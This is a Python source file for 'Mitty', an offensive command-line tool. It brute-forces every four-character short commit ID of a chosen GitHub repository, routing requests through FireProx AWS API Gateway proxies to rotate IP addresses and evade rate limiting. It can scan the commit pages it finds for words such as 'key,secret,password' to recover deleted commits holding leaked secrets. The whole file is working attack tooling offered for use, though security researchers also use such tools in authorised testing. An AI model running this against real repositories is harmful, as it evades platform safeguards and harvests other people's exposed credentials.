#!/usr/bin/env python3

from utils.fire import FireProx
from utils import parser
import argparse, requests, concurrent.futures, time, threading, sys, signal, re
from collections import defaultdict
from tqdm import tqdm
from bs4 import BeautifulSoup

########### Globals ###########
# FireProx Params
target_url = None
aws_key = None
aws_secret = None
aws_region = None

# Thread control
executor = None
quit = False
kill = 0

# Logging
log_name = ""

# Colors
reset = "\033[0m"
lightred = "\033[91m"
blue = "\033[34m"
lightgreen = "\033[92m"
gold = "\033[33m"

# Word Match
matches = []
###############################


### Functions ###


def check_repo(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return True
        else:
            return False

    except requests.exceptions.RequestException:
        return False


def arg_parser():
    # Import globals and regions comparison table
    global target_repo, aws_key, aws_secret, aws_region, matches

    regions = [
        "us-east-2",
        "us-east-1",
        "us-west-1",
        "us-west-2",
        "eu-west-3",
        "ap-northeast-1",
        "ap-northeast-2",
        "ap-south-1",
        "ap-southeast-1",
        "ap-southeast-2",
        "ca-central-1",
        "eu-central-1",
        "eu-west-1",
        "eu-west-2",
        "sa-east-1",
    ]

    parser = argparse.ArgumentParser(
        prog="Mitty",
        description="A command-line tool for brute-forcing commit IDs via FireProx.",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument(
        "-t",
        "--repository",
        type=str,
        required=False,
        help='The target GitHub repository in the format "USER/REPO" (e.g., e-nzym3/mitty)',
    )
    parser.add_argument(
        "-k",
        "--key",
        type=str,
        required=False,
        help="AWS key for FireProx",
    )
    parser.add_argument(
        "-s",
        "--secret",
        type=str,
        required=False,
        help="AWS secret key for FireProx",
    )
    parser.add_argument(
        "-r",
        "--region",
        type=str,
        required=False,
        default="us-east-1",
        help="AWS region to deploy gateways in (default = us-east-1)",
    )
    parser.add_argument(
        "-n",
        "--count",
        type=int,
        required=False,
        default=5,
        help="Number of concurrent streams use (default = 5)",
    )
    parser.add_argument(
        "-c",
        "--cleanup",
        action="store_true",
        default=False,
        help="Cleanup APIs from AWS",
    )
    parser.add_argument(
        "-m",
        "--match",
        type=str,
        required=False,
        help='Comma separated list of words to look for in commit pages (e.g., "key,secret,password")',
    )
    parser.add_argument(
        "-p",
        "--parse",
        action="store_true",
        default=False,
        help="Parse found commits to check which were deleted",
    )
    parser.add_argument(
        "--selenium-test",
        action="store_true",
        default=False,
        help="Test Selenium to ensure it is working as intended prior to parsing",
    )

    # Process args to appropriate global variables
    args = parser.parse_args()
    target_repo = f"https://github.com/{args.repository}"
    aws_key = args.key
    aws_secret = args.secret
    matches = args.match.split(",") if args.match else None

    if args.region not in regions:
        print(f'{lightred}[!] Supplied region "{args.region}" is not valid! Please select one of the following:')  # fmt: skip
        print(", ".join(regions))
        print(f"{reset}")
    else:
        aws_region = args.region

    if args.cleanup == False and not args.selenium_test and not args.repository:
        parser.error(f"{lightred}[!] --repository is required if --cleanup or --selenium-test is not set")  # fmt: skip

    return args


def fireprox_args(command, url, api_id=None):
    global target_repo, aws_key, aws_secret, aws_region

    args = {}
    args["access_key"] = aws_key
    args["secret_access_key"] = aws_secret
    args["url"] = url
    args["command"] = command
    args["region"] = aws_region
    args["api_id"] = api_id
    args["profile_name"] = None
    args["session_token"] = None

    help_str = "[!] Error, inputs cause error."

    return args, help_str


def create_api(region, url):
    args, help_str = fireprox_args("create", url)
    fp = FireProx(args, help_str)
    resource_id, proxy_url = fp.create_api(url)

    return {"api_gateway_id": resource_id, "proxy_url": proxy_url, "region": region}


def load_apis(region, url, count):
    apis = []
    print(f"{blue}[*] Generating API Gateways in {aws_region} region:{reset}")

    for x in range(count):
        apis.append(create_api(region, url.strip()))
        print(
            f"[+] Created API Gateway in {region} ID: {apis[x]['api_gateway_id']} - {lightgreen}{apis[x]['proxy_url']} => {url}{reset}"
        )

    return apis


def destroy_apis(region):
    print(f"\n{blue}[*] Destroying APIs:{reset}")
    args, helpstr = fireprox_args("list", region)
    fp = FireProx(args, helpstr)
    active_apis = fp.list_api()

    pbar = tqdm(
        total=len(active_apis),
        desc="Destroying APIs",
        unit=" apis",
        position=0,
        leave=False,
    )

    for a in active_apis:
        result = fp.delete_api(a["id"])
        success = "Success!" if result else "Failed!"
        tqdm.write(f'{lightgreen}[+] Destroying {a["id"]} => {success}{reset}')
        pbar.update(1)

    pbar.close()


def request_handler(count, logfile):
    # Setting up variables
    global target_repo, executor
    results = []
    lock = threading.Lock()

    # Create API gateways for requests
    apis = load_apis(aws_region, target_repo, count)

    # Total number of 4-character hex combinations for commit SHA-1 hashes
    total_combinations = 0x10000

    # Calculate the size of each bucket
    bucket_size = total_combinations // count
    remainder = total_combinations % count

    # Initialize the list of buckets
    buckets = []
    start = 0

    for i in range(count):
        ## Calculate the end of the current bucket
        end = start + bucket_size + (1 if i < remainder else 0)

        ## Create a bucket with hex strings
        bucket = [f"{j:04x}" for j in range(start, end)]
        buckets.append(bucket)

        ## Move to the next bucket
        start = end

    print(f"\n{blue}[*] Starting Brute Force:{reset}")

    # Create progress bar
    pbar = tqdm(
        total=total_combinations,
        unit=" requests",
        desc="Checking Commits",
        position=0,
        leave=False,
    )

    # Generate HTTP requests through each "api" through multithreading for each bucket
    def fetch_data(api, bucket):
        for commit_hash in bucket:
            global quit

            # Thread Control
            ## Thread break condition to allow for quick exit
            if quit:
                pbar.close()
                time.sleep(0.1)
                break

            url = f"{api['proxy_url']}commit/{commit_hash}"

            ## Create regex pattern based on strings supplied within the "match" argument
            match_pattern = None

            if matches:
                match_pattern = re.compile("|".join(re.escape(match) for match in matches), re.IGNORECASE)  # fmt: skip

            try:
                response = requests.get(url)
                html = BeautifulSoup(response.text, features="html5lib").find("body")
                with lock:
                    # If we have matches and the commit is found
                    if response.status_code == 200:
                        if match_pattern:
                            match = match_pattern.search(str(html))

                            if match:
                                tqdm.write(f"{gold}[+] Commit with '{match.group()}' Match Found: {target_repo}/commit/{commit_hash}{reset}")  # fmt: skip
                                logfile.write(f"{commit_hash}, {response.status_code}, {match.group()}\n")  # fmt: skip
                                results.append(commit_hash)
                                continue

                        tqdm.write(f"{lightgreen}[+] Commit Found: {target_repo}/commit/{commit_hash}{reset}")  # fmt:skip
                        logfile.write(f"{commit_hash},{response.status_code},N/A\n")  # fmt:skip
                        results.append(commit_hash)

            except requests.exceptions.RequestException as e:
                with lock:
                    logfile.write(f"{commit_hash},Error: {str(e)},N/A\n")

            pbar.update(1)

    ## Using ThreadPoolExecutor to manage concurrent threads
    executor = concurrent.futures.ThreadPoolExecutor()
    futures = [
        executor.submit(fetch_data, api, bucket) for api, bucket in zip(apis, buckets)
    ]
    concurrent.futures.wait(futures)

    return results


def interrupt_handler(signum, frame):
    global executor, quit, kill

    # Force kill program if CTRL + C was pressed twice
    kill += 1
    if kill >= 2:
        print(f"\n{lightred}[!] Force Exiting...{reset}")
        sys.exit(1)

    print(f"\n{lightred}[!] Ctrl-C was pressed. Killing threads... Press again to force close. {reset}")  # fmt: skip

    # Waiting .5 seconds so that tpdm can finish updating after the threads stop.
    time.sleep(0.5)

    # Kill process
    quit = True

    if executor:
        executor.shutdown(wait=True)

    destroy_apis(aws_region)
    print(f"\n\n{blue}[*] Results logged to: {log_name}{reset}\n")
    sys.exit(1)


def main():
    global log_name

    signal.signal(signal.SIGINT, interrupt_handler)

    # fmt: off
    print("                                                                                                    ")
    print("                                                       @@@@     @@@@                                ")
    print("               @@@@@@@@       @@@@@                 @@@@@@@@@@@@@@@@@@@@                            ")
    print("           @@@@@@@@@@@@@@@@@@@@@@@@@@            @@@@@.....:%@@#.....=@@@@@@@@@@@@@@@ @@@@@@@@      ")
    print("          @@@@@+::::+@%=::-#@+::::-*@@@@@@@@@@@@@@@@%*......=**-.....:+**%@@@@@@%@@@@@@@@@@@@@@@    ")
    print("        @@@@#:.......................+@@@@@#:..:#@@+......................-@@#.....#@@@*....=@@@    ")
    print("        @@@*..........................+@@@#......#@-.......................@@=.....=@@@-.....*@@@   ")
    print("       @@@@.......#%+........=%#:......@@@+......*@@+....................=%@@-.....=@@@-.....+@@@   ")
    print("       @@@@......*@@@........@@@#......@@@+......*@@@@......#@@+.....-%@@@@@@-.....-@@%-.....+@@@   ")
    print("       @@@@......*@@@........@@@#......@@@+......*@@@@......#@@+.....-%@@@@@@+......:=:......*@@@   ")
    print("       @@@@......*@@@........@@@#......@@@+......*@@@@......#@@+.....-%@@@@@@@=.............:%@@    ")
    print("       @@@@......*@@@-......:@@@@:....=@@@@:....:%@@@@=....-@@@%:....+@@@@@@@@@#-..........:=@@@    ")
    print("       @@@@......*@@@@#=-:-*@@@@@@*++#@@@@@@#++#@@@@@@@%*+#@@@@@@#++%@@@@@@@@@@@@@#*=......-@@@     ")
    print("        @@@#:...-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@#:.......-%@@      ")
    print("         @@@@@@@@@@@@  @@@@@@@@@  @@@@@@  @@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@:......:=@@@       ")
    print("                                                                             @@@@*:...:=%@@@        ")
    print("                                                                             @@@@@@...@@@@          ")
    print("                                                                               @@@@@@@@@@           ")
    print("                                                                                                    ")
    print("                            Mitty - by E-nzym3 (https://github.com/e-nzym3)                         ")
    # fmt: on

    print(f"\n{blue}[*] Starting Mitty...{reset}\n")

    args = arg_parser()

    if args.cleanup:
        destroy_apis(aws_region)

    elif args.selenium_test:
        try:
            parser.selenium_test("https://google.com")
        except Exception as e:
            print(f"{lightred}[!] Selenium test failed: {e}{reset}")
            sys.exit(1)

    else:
        ## Check if supplied repository exists and is accessible
        try:
            repo_check = check_repo(target_repo)
            if not repo_check:
                print(f"{lightred}[!] Error: {target_repo} is not a valid GitHub repository or is inaccessible. Please validate the supplied repo information{reset}")  # fmt: skip
                sys.exit(1)
        except Exception as e:
            print(f"{lightred}[!] Error: {str(e)}{reset}")
            sys.exit(1)

        ## Main execution and output file creation
        log_name = time.strftime(
            f"out_mitty_{args.repository.replace('/','-')}_%Y-%m-%d_%H-%M-%S.log",
            time.localtime(),
        )

        with open(log_name, "w") as logfile:
            logfile.write("Hash,Response Code,Matched Word\n")
            hashes = request_handler(args.count, logfile)
            print(f"\n{blue}[*] Results logged to: {log_name}{reset}\n")
            destroy_apis(aws_region)

            # If parsing is requested via arguments, run this
            if args.parse:
                print(f"\n{blue}[*] Parsing results...{reset}")
                parser.parser(args.repository, hashes, log_name)


if __name__ == "__main__":
    main()
